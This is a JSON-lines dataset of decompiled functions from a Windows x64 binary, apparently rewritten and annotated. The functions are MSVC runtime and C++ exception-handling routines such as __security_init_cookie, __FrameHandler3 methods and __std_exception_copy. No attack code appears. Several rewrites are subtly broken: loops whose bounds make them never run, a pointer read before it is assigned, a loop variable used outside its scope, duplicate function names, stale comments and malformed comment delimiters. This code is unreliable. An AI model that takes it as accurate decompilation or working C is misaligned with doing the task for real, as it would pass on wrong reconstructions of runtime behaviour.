{"Function Name": "__security_init_cookie", "Address": "14000b8c8", "Source Code": "\nvoid __cdecl __security_init_cookie(void)\n{\n    // Retrieve the current thread ID\n    DWORD currentThreadId = GetCurrentThreadId();\n    \n    // Retrieve the current process ID\n    DWORD currentProcessId = GetCurrentProcessId();\n    \n    // Declare a variable to hold the performance counter value\n    LARGE_INTEGER perfCounter;\n    \n    // Declare a variable to hold the file time\n    _FILETIME currentFileTime;\n\n    // Check if the global variable DAT_140038080 has a specific initial value\n    if (DAT_140038080 == 0x2b992ddfa232) {\n        // Get the current system time as file time\n        GetSystemTimeAsFileTime(&currentFileTime);\n        \n        // XOR the low date time with the thread ID\n        currentFileTime.dwLowDateTime ^= currentThreadId;\n        \n        // XOR the low date time with the process ID\n        currentFileTime.dwLowDateTime ^= currentProcessId;\n        \n        // Query the performance counter\n        QueryPerformanceCounter(&perfCounter);\n        \n        // Calculate a new value for DAT_140038080 using various components\n        DAT_140038080 = ((ulonglong)perfCounter.s.LowPart << 0x20 ^\n                         CONCAT44(perfCounter.s.HighPart, perfCounter.s.LowPart) ^\n                         (ulonglong)currentFileTime ^\n                         (ulonglong)&currentFileTime) & 0xffffffffffff;\n\n        // If the calculated value is still the initial value, change it\n        if (DAT_140038080 == 0x2b992ddfa232) {\n            DAT_140038080 = 0x2b992ddfa233;\n        }\n    }\n    \n    // Store the bitwise negation of DAT_140038080 in another global variable\n    DAT_140038078 = ~DAT_140038080;\n    \n    // Return from the function\n    return;\n}\n"}
{"Function Name": "FUN_14000b97c", "Address": "14000b97c", "Source Code": "\nvoid FUN_14000b97c(void)\n{\n    // Initialize the singly linked list head pointed to by DAT_140039c20\n    InitializeSListHead(&slist_head);\n}\n"}
{"Function Name": "FUN_14000b990", "Address": "14000b990", "Source Code": "\n// Function declaration: FUN_14000b990 returns a pointer to an undefined type\nundefined * getUndefinedPointer(void)\n{\n    // Return the address of the global variable DAT_140039c30\n    return &globalUndefinedVar;\n}\n"}
{"Function Name": "FUN_14000b998", "Address": "14000b998", "Source Code": "\nvoid FUN_14000b998(void)\n{\n    ulonglong *pointerToUlonglong; // Declare a pointer to ulonglong\n\n    pointerToUlonglong = (ulonglong *)FUN_14000a5f4(); // Call function and assign the result to puVar1\n    *pointerToUlonglong |= 4; // Set the 3rd bit of the value pointed to by puVar1\n\n    pointerToUlonglong = (ulonglong *)FUN_14000b990(); // Call another function and assign the result to puVar1\n    *pointerToUlonglong |= 2; // Set the 2nd bit of the value pointed to by puVar1\n}\n"}
{"Function Name": "FUN_14000b9b4", "Address": "14000b9b4", "Source Code": "\n// Function declaration: FUN_14000b9b4 returns a boolean value\nbool isValueFalse(void)\n{\n    // Return the logical negation of the value stored at DAT_1400380a8\n    return !storedValue;\n}\n"}
{"Function Name": "FUN_14000b9c0", "Address": "14000b9c0", "Source Code": "\n// Function declaration: FUN_14000b9c0 returns a pointer of type 'undefined'\nundefined * getUndefinedPointer(void)\n{\n    // Return the value stored in the global variable DAT_14003ad48\n    return globalUndefinedPointer;\n}\n"}
{"Function Name": "FUN_14000b9c8", "Address": "14000b9c8", "Source Code": "\n// Function declaration: FUN_14000b9c8 returns a pointer of type 'undefined'\nundefined * getUndefinedPointer(void)\n{\n    // Return the value stored in the global variable DAT_14003ad40\n    return globalUndefinedPointer;\n}\n"}
{"Function Name": "FUN_14000b9d0", "Address": "14000b9d0", "Source Code": "\nvoid FUN_14000b9d0(void) // Function definition\n{\n    longlong *longlongPointer; // Declare a pointer to longlong\n    // Iterate over a range starting from the address of DAT_140033ee0\n    for (longlongPointer = &dataStart; longlongPointer < &dataStart; longlongPointer++) {\n        // Check if the value pointed to by plVar1 is not zero\n        if (*longlongPointer != 0) {\n            // Call the function pointed to by PTR__guard_dispatch_icall_1400213e8\n            (*(code *)functionPointer)();\n        }\n    }\n}\n"}
{"Function Name": "FUN_14000ba0c", "Address": "14000ba0c", "Source Code": "\nvoid FUN_14000ba0c(void)\n{\n    longlong *longlongPtr; // Declare a pointer to longlong\n\n    // Iterate over a range of memory addresses starting from DAT_140033ef0\n    for (longlongPtr = &startAddress; longlongPtr < &startAddress; longlongPtr++) {\n        // Check if the value at the current address is not zero\n        if (*longlongPtr != 0) {\n            // Call a function pointed to by PTR__guard_dispatch_icall_1400213e8\n            (*(code *)functionPointer)();\n        }\n    }\n}\n"}
{"Function Name": "_CallSETranslator<>", "Address": "14000ba50", "Source Code": "\nundefined4 callSETranslator(undefined4 *threadData, undefined8 arg2, undefined8 arg3)\n{\n    // Retrieve the current thread's data structure\n    getCurrentThreadData();\n    \n    // Dispatch the call to the appropriate function using the guard mechanism\n    (*(code *)guardDispatchCall)(*threadData, threadData);\n    \n    // Return 0 indicating successful completion\n    return 0;\n}\n"}
{"Function Name": "__FrameHandler3::CatchTryBlock", "Address": "14000baa4", "Source Code": "\\*\n_s_TryBlockMapEntry * __cdecl __FrameHandler3::CatchTryBlock(_s_FuncInfo *functionInfo, int catchParameter)\n{\n    longlong threadDataPointer; // Variable to hold the thread-local storage pointer\n    _s_TryBlockMapEntry *currentTryBlockEntry; // Pointer to the current try block entry\n    ulonglong tryBlockCount = (ulonglong)functionInfo->nTryBlocks; // Number of try blocks\n\n    // Loop through all try blocks in reverse order\n    while (tryBlockCount > 0) {\n        tryBlockCount--; // Decrement the try block counter\n        threadDataPointer = __vcrt_getptd(); // Get the pointer to thread data\n        // Calculate the address of the current try block entry\n        currentTryBlockEntry = (_s_TryBlockMapEntry *)((longlong)(int)functionInfo->dispTryBlockMap + *(longlong *)(threadDataPointer + 0x60) + tryBlockCount * 0x14);\n        \n        // Check if the current catch block is valid for the given parameter\n        if (catchParameter > currentTryBlockEntry->tryHigh && currentTryBlockEntry->catchHigh >= catchParameter) {\n            return currentTryBlockEntry; // Return the found try block entry\n        }\n    }\n    return (_s_TryBlockMapEntry *)0x0; // Return null if no matching try block is found\n}\n*\\ \n \n\n_s_TryBlockMapEntry * __cdecl __FrameHandler3::CatchTryBlock(_s_FuncInfo *functionInfo, int catchParameter)\n{\n    longlong threadDataPointer;\n    _s_TryBlockMapEntry *currentTryBlockEntry;\n    ulonglong tryBlockCount = (ulonglong)functionInfo->nTryBlocks;\n\n    while (tryBlockCount > 0) {\n        tryBlockCount--;\n        threadDataPointer = __vcrt_getptd();\n        currentTryBlockEntry = (_s_TryBlockMapEntry *)((longlong)(int)functionInfo->dispTryBlockMap + *(longlong *)(threadDataPointer + 0x60) + tryBlockCount * 0x14);\n        if (catchParameter > currentTryBlockEntry->tryHigh && currentTryBlockEntry->catchHigh >= catchParameter) {\n            return currentTryBlockEntry;\n        }\n    }\n    return (_s_TryBlockMapEntry *)0x0;\n}\n"}
{"Function Name": "__FrameHandler3::ExecutionInCatch", "Address": "14000baf8", "Source Code": "\nbool __cdecl __FrameHandler3::ExecutionInCatch(_xDISPATCHER_CONTEXT *dispatcher_context, _s_FuncInfo *func_info)\n{\n    // Call FUN_14000cf24 with param_2 and param_1, and check if it returns a valid pointer\n    // Pass the result to CatchTryBlock along with param_2\n    // Return true if CatchTryBlock does not return a null pointer, indicating a catch block is active\n    return CatchTryBlock(func_info, FUN_14000cf24(func_info, dispatcher_context)) != (_s_TryBlockMapEntry *)0x0;\n}\n"}
{"Function Name": "__FrameHandler3::FrameUnwindToEmptyState", "Address": "14000bb24", "Source Code": "\nvoid __cdecl\n__FrameHandler3::FrameUnwindToEmptyState\n(__uint64 *param_1, _xDISPATCHER_CONTEXT *param_2, _s_FuncInfo *param_3)\n{\n    __uint64 *p_Var2; // Pointer to the established frame\n    _s_TryBlockMapEntry *p_Var3; // Pointer to the try block map entry\n    __ehstate_t _Var4; // Variable to hold the high state of the try block\n\n    // Get the establisher frame using the provided parameters\n    p_Var2 = GetEstablisherFrame(param_1, param_2, param_3, NULL);\n\n    // Determine the high state of the try block, defaulting to -1 if not found\n    _Var4 = p_Var3 ? p_Var3->tryHigh : -1;\n\n    // Retrieve the catch try block entry based on the function info and dispatcher context\n    p_Var3 = CatchTryBlock(param_3, FUN_14000cf24(param_3, param_2));\n\n    // Perform the unwind operation to the established frame with the given parameters\n    FUN_14000e074(p_Var2, param_2, param_3, _Var4);\n\n    return; // Exit the function\n}\n"}
{"Function Name": "__FrameHandler3::GetEstablisherFrame", "Address": "14000bb88", "Source Code": "\\*\n__uint64 * __cdecl\n__FrameHandler3::GetEstablisherFrame\n(__uint64 *param_1,_xDISPATCHER_CONTEXT *param_2,_s_FuncInfo *param_3,__uint64 *param_4)\n{\n    int iVar2; // Variable to store the result of FUN_14000cf24\n    PRUNTIME_FUNCTION p_Var3; // Pointer to a runtime function\n    ulonglong uVar5 = 0; // Unused variable\n    longlong lVar7; // Variable for calculating the address of the try block\n    ulonglong uVar8 = (ulonglong)param_3->nTryBlocks; // Number of try blocks\n\n    iVar2 = FUN_14000cf24(param_3,param_2); // Call to get the current exception handler\n    *param_4 = *param_1; // Initialize the output parameter with the value of param_1\n\n    do {\n        if ((int)uVar8 == 0) { // Check if there are no more try blocks to process\n            return param_4; // Return the output parameter if no try blocks left\n        }\n        uVar8--; // Decrement the try block counter\n\n        // Calculate the address of the current try block\n        lVar7 = (longlong)(int)param_3->dispTryBlockMap + uVar8 * 0x14 + *(longlong *)(param_2 + 8);\n        // Check if the current exception is within the bounds of the try block\n        if ((iVar2 <= *(int *)(lVar7 + 4)) || (*(int *)(lVar7 + 8) < iVar2)) {\n            continue; // Continue to the next try block if out of bounds\n        }\n\n        // Lookup the function entry for the current exception\n        p_Var3 = RtlLookupFunctionEntry(*(DWORD64 *)param_2, NULL, (PUNWIND_HISTORY_TABLE)0x0);\n        longlong lVar9 = (longlong)*(int *)(lVar7 + 0x10) + (ulonglong)NULL; // Calculate the base address for the function\n        uint uVar1 = *(uint *)(lVar7 + 0xc); // Get the number of handlers for the current try block\n        \n        if (uVar1 != 0) { // Check if there are any handlers\n            int *piVar6 = (int *)(lVar9 + 0xc); // Pointer to the first handler\n            for (uint uVar4 = 0; uVar4 < uVar1; uVar4++) { // Iterate through the handlers\n                if ((longlong)*piVar6 == (ulonglong)p_Var3->BeginAddress) { // Check if the handler matches the current function\n                    break; // Break if a match is found\n                }\n                piVar6 += 5; // Move to the next handler\n            }\n            if (uVar4 < uVar1) { // If a matching handler was found\n                *param_4 = *(__uint64 *)((longlong)*(int *)(lVar9 + 0x10 + uVar4 * 0x14) + *param_1); // Set the output parameter to the corresponding value\n                return param_4; // Return the output parameter\n            }\n        }\n    } while (true); // Continue the loop indefinitely\n}\n*\\ \n \n\n__uint64 * __cdecl\n__FrameHandler3::GetEstablisherFrame\n(__uint64 *param_1,_xDISPATCHER_CONTEXT *param_2,_s_FuncInfo *param_3,__uint64 *param_4)\n{\n    int iVar2;\n    PRUNTIME_FUNCTION p_Var3;\n    ulonglong uVar5 = 0;\n    longlong lVar7;\n    ulonglong uVar8 = (ulonglong)param_3->nTryBlocks;\n\n    iVar2 = FUN_14000cf24(param_3,param_2);\n    *param_4 = *param_1;\n\n    do {\n        if ((int)uVar8 == 0) {\n            return param_4;\n        }\n        uVar8--;\n\n        lVar7 = (longlong)(int)param_3->dispTryBlockMap + uVar8 * 0x14 + *(longlong *)(param_2 + 8);\n        if ((iVar2 <= *(int *)(lVar7 + 4)) || (*(int *)(lVar7 + 8) < iVar2)) {\n            continue;\n        }\n\n        p_Var3 = RtlLookupFunctionEntry(*(DWORD64 *)param_2, NULL, (PUNWIND_HISTORY_TABLE)0x0);\n        longlong lVar9 = (longlong)*(int *)(lVar7 + 0x10) + (ulonglong)NULL;\n        uint uVar1 = *(uint *)(lVar7 + 0xc);\n        \n        if (uVar1 != 0) {\n            int *piVar6 = (int *)(lVar9 + 0xc);\n            for (uint uVar4 = 0; uVar4 < uVar1; uVar4++) {\n                if ((longlong)*piVar6 == (ulonglong)p_Var3->BeginAddress) {\n                    break;\n                }\n                piVar6 += 5;\n            }\n            if (uVar4 < uVar1) {\n                *param_4 = *(__uint64 *)((longlong)*(int *)(lVar9 + 0x10 + uVar4 * 0x14) + *param_1);\n                return param_4;\n            }\n        }\n    } while (true);\n}\n"}
{"Function Name": "FUN_14000bc54", "Address": "14000bc54", "Source Code": "\nundefined8 *\nFUN_14000bc54(undefined8 *param_1, undefined8 param_2, int param_3, _xDISPATCHER_CONTEXT *param_4, _s_FuncInfo *param_5)\n{\n    longlong currentTryBlockAddress; // Variable to hold calculated address for try block\n    longlong dispatcherContextBaseAddress; // Variable to hold the base address of the dispatcher context\n    code *exceptionHandlingFunctionPointer; // Pointer to a function code\n    uint tempUintValue; // Temporary variable for storing a uint value\n    int exceptionCodeResult; // Variable to hold the result of a function call\n    uint numberOfTryBlocks; // Number of try blocks\n    undefined8 *exceptionHandlingReturnValue; // Pointer to return value\n    int *currentTryBlockInfoPointer; // Pointer to the current try block information\n    uint tryBlockLoopVariable; // Loop variable for try blocks\n    uint loopIterationTempVariable; // Temporary variable for loop iteration\n    longlong foundTryBlockAddress; // Variable to hold the address of the current try block\n    uint foundTryBlockIndex; // Variable to track the found try block index\n    longlong tryBlockMappingOffset; // Variable to hold the offset for try block mapping\n\n    foundTryBlockAddress = 0; // Initialize lVar11 to 0\n    numberOfTryBlocks = param_5->nTryBlocks; // Get the number of try blocks from the function info\n    exceptionCodeResult = FUN_14000cf24(param_5, param_4); // Call function to get the current exception code\n    if (numberOfTryBlocks == 0) { // Check if there are no try blocks\n        terminate(); // Terminate the program if no try blocks exist\n        exceptionHandlingFunctionPointer = (code *)swi(3); // Get the address of the exception handling function\n        exceptionHandlingReturnValue = (undefined8 *)(*exceptionHandlingFunctionPointer)(); // Call the exception handling function\n        return exceptionHandlingReturnValue; // Return the result of the exception handling function\n    }\n    dispatcherContextBaseAddress = *(longlong *)(param_4 + 8); // Get the address of the try block information\n    tryBlockMappingOffset = (longlong)(int)param_5->dispTryBlockMap; // Get the offset for the try block map\n    foundTryBlockIndex = 0xffffffff; // Initialize uVar12 to indicate no valid try block found\n    tryBlockLoopVariable = numberOfTryBlocks; // Set uVar9 to the number of try blocks\n    do {\n        loopIterationTempVariable = tryBlockLoopVariable - 1; // Decrement uVar9 to iterate through try blocks\n        currentTryBlockAddress = dispatcherContextBaseAddress + (ulonglong)loopIterationTempVariable * 0x14; // Calculate the address of the current try block\n        // Check if the current exception code is within the bounds of the try block\n        if ((*(int *)(currentTryBlockAddress + 4 + tryBlockMappingOffset) < exceptionCodeResult) && (exceptionCodeResult <= *(int *)(currentTryBlockAddress + 8 + tryBlockMappingOffset))) break; \n        tryBlockLoopVariable = loopIterationTempVariable; // Update uVar9 for the next iteration\n    } while (loopIterationTempVariable != 0); // Continue until all try blocks are checked\n    if (tryBlockLoopVariable != 0) { // If a valid try block was found\n        foundTryBlockAddress = tryBlockMappingOffset + (ulonglong)(tryBlockLoopVariable - 1) * 0x14 + dispatcherContextBaseAddress; // Set lVar11 to the address of the found try block\n    }\n    currentTryBlockInfoPointer = (int *)(dispatcherContextBaseAddress + tryBlockMappingOffset); // Initialize piVar8 to point to the first try block\n    loopIterationTempVariable = 0; // Initialize loop counter\n    do {\n        tempUintValue = foundTryBlockIndex; // Store the current value of uVar12\n        // Check if the current try block is valid and if param_3 is within its bounds\n        if ((((foundTryBlockAddress == 0) || ((*(int *)(foundTryBlockAddress + 4) < *currentTryBlockInfoPointer && (currentTryBlockInfoPointer[1] <= *(int *)(foundTryBlockAddress + 8)))) && (*currentTryBlockInfoPointer <= param_3)) &&\n            (param_3 <= currentTryBlockInfoPointer[1] && (tempUintValue = loopIterationTempVariable, foundTryBlockIndex != 0xffffffff)))) {\n            tempUintValue = foundTryBlockIndex; // Update uVar4 if conditions are met\n        }\n        foundTryBlockIndex = tempUintValue; // Update uVar12 with the found index\n        loopIterationTempVariable++; // Increment loop counter\n        currentTryBlockInfoPointer += 5; // Move to the next try block\n    } while (loopIterationTempVariable < numberOfTryBlocks); // Continue until all try blocks are checked\n    \n    *param_1 = param_2; // Set the first element of param_1 to param_2\n    param_1[1] = CONCAT44(0, foundTryBlockIndex != 0xffffffff ? foundTryBlockIndex : 0); // Set the second element based on uVar12\n    param_1[2] = param_2; // Set the third element of param_1 to param_2\n    param_1[3] = CONCAT44(0, foundTryBlockIndex != 0xffffffff ? tryBlockLoopVariable + 1 : 0); // Set the fourth element based on uVar9\n    return param_1; // Return the updated param_1\n}\n"}
{"Function Name": "FUN_14000bd94", "Address": "14000bd94", "Source Code": "\nvoid FUN_14000bd94(undefined8 *exceptionHandler, ULONG_PTR param1, ULONG_PTR param2, ULONG_PTR param3,\n                   ULONG_PTR param4, ULONG_PTR param5, int exceptionCode, undefined8 exceptionInfo1,\n                   undefined8 exceptionInfo2, undefined8 *exceptionRecord, byte flag)\n{\n    undefined1 localBuffer[32]; // Stack buffer for local variables\n    EXCEPTION_RECORD exceptionRecordStruct; // Structure to hold exception information\n    _CONTEXT contextStruct; // Context structure for the thread\n    ulonglong stackCookie = DAT_140038080 ^ (ulonglong)localBuffer; // Cookie for stack protection\n\n    // Initialize the exception record fields\n    exceptionRecordStruct._0_8_ = _DAT_140025d80; // Exception code\n    exceptionRecordStruct.ExceptionRecord = _UNK_140025d88; // Pointer to the previous exception record\n    exceptionRecordStruct.ExceptionAddress = _DAT_140025d90; // Address where the exception occurred\n    exceptionRecordStruct._24_8_ = _UNK_140025d98; // Additional information\n    exceptionRecordStruct.ExceptionInformation[9] = _UNK_140025de8; // Custom exception information\n    exceptionRecordStruct.ExceptionInformation[10]._0_4_ = _DAT_140025df0; // More exception info\n    exceptionRecordStruct.ExceptionInformation[10]._4_4_ = _UNK_140025df4; // More exception info\n    exceptionRecordStruct.ExceptionInformation[0xb]._0_4_ = _UNK_140025df8; // More exception info\n    exceptionRecordStruct.ExceptionInformation[0xb]._4_4_ = _UNK_140025dfc; // More exception info\n    exceptionRecordStruct.ExceptionInformation[0xc]._0_4_ = _DAT_140025e00; // More exception info\n    exceptionRecordStruct.ExceptionInformation[0xc]._4_4_ = _UNK_140025e04; // More exception info\n    exceptionRecordStruct.ExceptionInformation[0xd]._0_4_ = _UNK_140025e08; // More exception info\n    exceptionRecordStruct.ExceptionInformation[0xd]._4_4_ = _UNK_140025e0c; // More exception info\n    exceptionRecordStruct.ExceptionInformation[0xe] = DAT_140025e10; // More exception info\n    exceptionRecordStruct.ExceptionInformation[0] = (ULONG_PTR)__FrameHandler3::CxxCallCatchBlock; // Handler for C++ exceptions\n    exceptionRecordStruct.ExceptionInformation[2] = param4; // Parameter for exception handling\n    exceptionRecordStruct.ExceptionInformation[3] = (ULONG_PTR)exceptionCode; // Parameter for exception handling\n    exceptionRecordStruct.ExceptionInformation[5] = param5; // Parameter for exception handling\n    exceptionRecordStruct.ExceptionInformation[7] = (ULONG_PTR)flag; // Parameter for exception handling\n    exceptionRecordStruct.ExceptionInformation[8] = 0x19930520; // Custom exception information\n    exceptionRecordStruct.ExceptionInformation[1] = param3; // Parameter for exception handling\n    exceptionRecordStruct.ExceptionInformation[4] = param2; // Parameter for exception handling\n    exceptionRecordStruct.ExceptionInformation[6] = param1; // Parameter for exception handling\n\n    // Call the unwind function to handle the exception\n    RtlUnwindEx((PVOID)*exceptionHandler, (PVOID)*exceptionRecord, &exceptionRecordStruct, (PVOID)0x0, &contextStruct,\n                 (PUNWIND_HISTORY_TABLE)exceptionRecord[8]);\n    // Check for stack corruption using the cookie\n    __security_check_cookie(stackCookie ^ (ulonglong)localBuffer);\n    return; // Exit the function\n}\n"}
{"Function Name": "_CreateFrameInfo", "Address": "14000beb8", "Source Code": "\nundefined8 * _CreateFrameInfo(undefined8 *frame_info_ptr, undefined8 value)\n{\n    *frame_info_ptr = value; // Assign the value of param_2 to the location pointed by param_1\n    longlong thread_local_data = __vcrt_getptd(); // Retrieve the thread-local data pointer\n    // Check if param_1 is less than the value at the address stored in lVar1 + 0x58\n    frame_info_ptr[1] = (frame_info_ptr < *(undefined8 **)(thread_local_data + 0x58)) ? *(undefined8 *)(thread_local_data + 0x58) : 0; \n    // Update the value at lVar1 + 0x58 to point to param_1\n    *(undefined8 **)(thread_local_data + 0x58) = frame_info_ptr; \n    return frame_info_ptr; // Return the updated param_1 pointer\n}\n"}
{"Function Name": "_FindAndUnlinkFrame", "Address": "14000bef4", "Source Code": "\nvoid _FindAndUnlinkFrame(longlong frame_id)\n{\n    // Get the pointer to the thread data\n    longlong current_frame = __vcrt_getptd();\n    \n    // Check if the provided parameter matches the current frame\n    if (frame_id == *(longlong *)(current_frame + 0x58)) {\n        // Get the next frame in the linked list\n        current_frame = *(longlong *)(current_frame + 0x58);\n        \n        // Traverse the linked list of frames\n        while (current_frame != 0) {\n            // Get the next frame pointer\n            longlong next_frame = *(longlong *)(current_frame + 8);\n            \n            // Check if the current frame matches the parameter\n            if (frame_id == current_frame) {\n                // Unlink the current frame by updating the pointer\n                *(longlong *)(__vcrt_getptd() + 0x58) = next_frame;\n                return; // Exit the function after unlinking\n            }\n            // Move to the next frame in the list\n            current_frame = next_frame;\n        }\n    }\n    \n    // Terminate the program if the frame was not found\n    terminate();\n    \n    // Call the system interrupt for further processing\n    ((code *)swi(3))();\n}\n"}
{"Function Name": "_GetImageBase", "Address": "14000bf48", "Source Code": "\nundefined8 getImageBase(void)\n{\n    // Retrieve the pointer to the thread data structure\n    // and add an offset of 0x60 to access the image base address\n    return *(undefined8 *)(getThreadDataPointer() + 0x60);\n}\n"}
{"Function Name": "_GetThrowImageBase", "Address": "14000bf5c", "Source Code": "\nundefined8 getThrowImageBase(void)\n{\n    // Retrieve the pointer to the thread data structure\n    // and add an offset of 0x68 to access a specific field\n    return *(undefined8 *)(getThreadDataPointer() + 0x68);\n}\n"}
{"Function Name": "FUN_14000bf70", "Address": "14000bf70", "Source Code": "\nvoid FUN_14000bf70(undefined8 input_value)\n{\n    // Store the value of param_1 into a specific offset (0x60) of the thread-local storage structure\n    *(undefined8 *)(__vcrt_getptd() + 0x60) = input_value;\n}\n"}
{"Function Name": "FUN_14000bf88", "Address": "14000bf88", "Source Code": "\nvoid FUN_14000bf88(undefined8 input_value)\n{\n    // Store the value of param_1 at the memory location offset by 0x68 from the thread-local storage pointer\n    *(undefined8 *)(get_thread_local_storage() + 0x68) = input_value;\n}\n"}
{"Function Name": "__CxxFrameHandler3", "Address": "14000bfa0", "Source Code": "\nvoid __CxxFrameHandler3(EHExceptionRecord *exception_record, __uint64 thread_id, _CONTEXT *context, _xDISPATCHER_CONTEXT *dispatcher_context)\n{\n    longlong thread_data_pointer; // Variable to hold the pointer to the thread data\n    __uint64 local_thread_id = thread_id; // Local variable to store the second parameter\n\n    thread_data_pointer = __vcrt_getptd(); // Retrieve the pointer to the thread data structure\n    *(undefined8 *)(thread_data_pointer + 0x60) = *(undefined8 *)(dispatcher_context + 8); // Store a value from the dispatcher context into thread data\n    *(undefined8 *)(thread_data_pointer + 0x68) = *(undefined8 *)(exception_record + 0x38); // Store a value from the exception record into thread data\n\n    // Call a function with the exception record, local variable, context, dispatcher context, and other parameters\n    FUN_14000db5c(exception_record, &local_thread_id, context, dispatcher_context,\n                  (_s_FuncInfo *)((ulonglong)**(uint **)(dispatcher_context + 0x38) + *(longlong *)(thread_data_pointer + 0x60)), 0,\n                  (__uint64 *)0x0, 0);\n    return; // Exit the function\n}\n"}
{"Function Name": "__std_exception_copy", "Address": "14000c028", "Source Code": "\nvoid __std_exception_copy(longlong *source, longlong *destination)\n{\n    // Check if the second element of param_1 is null or if the first element is zero\n    if (((char)source[1] == '\\0') || (*source == 0)) {\n        // If condition is true, copy the value from param_1 to param_2\n        *destination = *source;\n        // Set the second element of param_2 to zero\n        *(undefined1 *)(destination + 1) = 0;\n    }\n    else {\n        // Initialize lVar1 to -1 for string length calculation\n        longlong string_length = -1;\n        // Calculate the length of the string pointed to by param_1\n        while (*(char *)(*source + string_length + 1) != '\\0') {\n            string_length++;\n        }\n        // Allocate memory for the new string including null terminator\n        char *allocated_string = (char *)_malloc_base(string_length + 2);\n        // Check if memory allocation was successful\n        if (allocated_string != (char *)0x0) {\n            // Copy the string from param_1 to the newly allocated memory\n            strcpy_s(allocated_string, string_length + 2, (char *)*source);\n            // Set the second element of param_2 to 1 indicating a successful copy\n            *(undefined1 *)(destination + 1) = 1;\n            // Store the address of the new string in param_2\n            *destination = (longlong)allocated_string;\n        }\n        // Call a function to perform additional operations on the copied string\n        FUN_14000ead0(allocated_string);\n    }\n    // Return from the function\n    return;\n}\n"}
{"Function Name": "__std_exception_destroy", "Address": "14000c0b8", "Source Code": "\nvoid __std_exception_destroy(undefined8 *exception_ptr)\n{\n    // Check if the second byte of the parameter is not null\n    if (*(char *)(exception_ptr + 1) != '\\0') {\n        // Call the function FUN_14000ead0 with the first element of param_1 as argument\n        destroy_function((pointer_type)*exception_ptr);\n    }\n    // Set the first element of param_1 to 0\n    *exception_ptr = 0;\n    // Set the second element of param_1 to 0\n    *(exception_ptr + 1) = 0;\n}\n"}
{"Function Name": "_purecall", "Address": "14000c0e0", "Source Code": "\nvoid _purecall(void) // Function definition for _purecall\n{\n    // Check if the result of the XOR operation between DAT_140038080 and DAT_140039cc0\n    // is non-zero when shifted right by the lower 6 bits of DAT_140038080\n    if ((data1 ^ data2) >> ((byte)data1 & 0x3f) != 0 ||\n        // Check if the result of the XOR operation is non-zero when shifted left by\n        // the difference between 64 and the lower 6 bits of DAT_140038080\n        (data1 ^ data2) << (0x40 - ((byte)data1 & 0x3f)) != 0) {\n        \n        // Call the function pointed to by PTR__guard_dispatch_icall_1400213e8\n        (*(code *)guard_dispatch_function)();\n    }\n    // Terminate the program execution\n    abort();\n}\n"}
{"Function Name": "__DestructExceptionObject", "Address": "14000c110", "Source Code": "\nvoid __DestructExceptionObject(int *exception_object)\n{\n    byte *byte_pointer; // Pointer to a byte variable\n\n    // Check if param_1 is not null, has a specific value, and the sixth element is 4\n    if (exception_object != (int *)0x0 && *exception_object == -0x1f928c9d && exception_object[6] == 4) {\n        byte_pointer = *(byte **)(exception_object + 0xc); // Get the byte pointer from the 12th element of param_1\n\n        // Check if pbVar1 is not null and the condition on the 8th element of param_1\n        if (byte_pointer != (byte *)0x0 && (exception_object[8] + 0xe66cfae0U < 3)) {\n            // Check if the integer at the offset of pbVar1 is zero\n            if (*(int *)(byte_pointer + 4) == 0) {\n                // Check if the 4th bit of pbVar1 is set and the first element of the pointer at the 10th element of param_1 is not null\n                if ((*byte_pointer & 0x10) != 0 && **(longlong **)(exception_object + 10) != 0) {\n                    // Call the function pointed to by PTR__guard_dispatch_icall_1400213e8\n                    (*(code *)PTR__guard_dispatch_icall_1400213e8)();\n                }\n            } else {\n                // Call FUN_14000c184 with the appropriate parameters\n                FUN_14000c184(*(undefined8 *)(exception_object + 10),\n                              (undefined *)((longlong)*(int *)(byte_pointer + 4) + *(longlong *)(exception_object + 0xe)));\n            }\n        }\n    }\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_14000c184", "Address": "14000c184", "Source Code": "\nvoid FUN_14000c184(undefined8 input_param, undefined *function_pointer)\n{\n    // Cast the UNRECOVERED_JUMPTABLE pointer to a function pointer type\n    // and invoke the function it points to.\n    ((void (*)())function_pointer)();\n}\n"}
{"Function Name": "_IsExceptionObjectToBeDestroyed", "Address": "14000c188", "Source Code": "\nundefined4 checkExceptionObjectDestruction(longlong exceptionObjectId)\n{\n    // Retrieve a pointer to the thread-local storage structure\n    longlong *currentExceptionObject = *(longlong **)(getThreadLocalStorage() + 0x58);\n    \n    // Iterate through the linked list of exception objects\n    while (currentExceptionObject != (longlong *)0x0) {\n        // Check if the current exception object matches the parameter\n        if (*currentExceptionObject == exceptionObjectId) \n            return 0; // Return 0 if the object is found (not to be destroyed)\n        \n        // Move to the next exception object in the list\n        currentExceptionObject = (longlong *)currentExceptionObject[1];\n    }\n    \n    // Return 1 if the object is not found (can be destroyed)\n    return 1;\n}\n"}
{"Function Name": "__AdjustPointer", "Address": "14000c1b8", "Source Code": "\nlonglong __AdjustPointer(longlong base_pointer, int *offset_array)\n{\n    // Calculate the initial adjusted pointer value by adding param_1 to the value pointed by param_2\n    longlong adjusted_pointer = *offset_array + base_pointer;\n\n    // Check if the second element of param_2 is greater than -1\n    if (-1 < offset_array[1]) {\n        // Adjust lVar1 by adding the value at the calculated address and the second element of param_2\n        adjusted_pointer += (longlong)*(int *)((longlong)offset_array[2] + *(longlong *)(offset_array[1] + base_pointer)) + (longlong)offset_array[1];\n    }\n\n    // Return the final adjusted pointer value\n    return adjusted_pointer;\n}\n"}
{"Function Name": "__FrameUnwindFilter", "Address": "14000c1dc", "Source Code": "\nundefined8 __FrameUnwindFilter(undefined8 *thread_data_ptr)\n{\n    int *error_code_ptr = (int *)*thread_data_ptr; // Dereference param_1 to get the integer pointer\n    longlong thread_data; // Declare a variable to hold a long long value\n\n    // Check if the value pointed to by piVar1 matches specific error codes\n    if ((*error_code_ptr == -0x1fbcbcae) || (*error_code_ptr == -0x1fbcb0b3)) {\n        thread_data = __vcrt_getptd(); // Get the pointer to thread data\n        // Check if the value at offset 0x30 is greater than 0\n        if (0 < *(int *)(thread_data + 0x30)) {\n            *(int *)(thread_data + 0x30) -= 1; // Decrement the value at offset 0x30\n        }\n    }\n    // Check if the value pointed to by piVar1 matches another specific error code\n    else if (*error_code_ptr == -0x1f928c9d) {\n        thread_data = __vcrt_getptd(); // Get the pointer to thread data\n        *(undefined4 *)(thread_data + 0x30) = 0; // Set the value at offset 0x30 to 0\n        terminate(); // Call the terminate function\n        return ((code *)swi(3))(); // Call a system interrupt and return its result\n    }\n    return 0; // Return 0 if no conditions were met\n}\n"}
